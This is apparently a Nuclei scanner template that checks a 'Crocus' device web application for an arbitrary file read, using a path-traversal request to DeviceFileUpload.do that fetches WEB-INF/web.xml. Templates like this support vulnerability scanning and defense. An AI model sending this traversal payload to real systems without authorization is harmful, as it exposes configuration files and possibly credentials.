id: Crocus-DeviceFileUpload-ReadAnyFile
info:
  name: Crocus-DeviceFileUpload-ReadAnyFile
  author: iSee857
  severity: high
  description: |
    Crocus-DeviceFileUpload-ReadAnyFile

http:
  - raw:
      - |
        GET /DeviceFileUpload.do?Action=Download&&path=/../WEB-INF/web.xml HTTP/1.1
        Host: {{Hostname}}

    redirects: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "</servlet>"
          - "<welcome-file-list>"
        condition: and